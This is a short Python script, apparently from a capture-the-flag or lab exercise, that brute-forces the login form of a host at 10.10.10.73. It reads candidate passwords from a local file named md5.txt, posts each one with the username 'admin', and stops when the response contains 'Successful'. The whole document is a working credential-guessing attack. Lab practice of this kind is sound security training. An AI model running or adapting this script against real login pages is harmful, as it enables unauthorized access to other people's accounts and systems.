#!/usr/bin/env python3

from urllib import request

url = "http://10.10.10.73/login.php"
headers = {"User-Agent":"Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"}

with open("./md5.txt") as f:
    for l in f:
        line = l.strip('\n')
        data = f"username=admin&password={line}".encode()
        req = request.Request(url, headers=headers, data=data)
        resp = request.urlopen(req).read().decode()
        if "Successful" in resp:
            print("Got it: %s" %(line))
            break
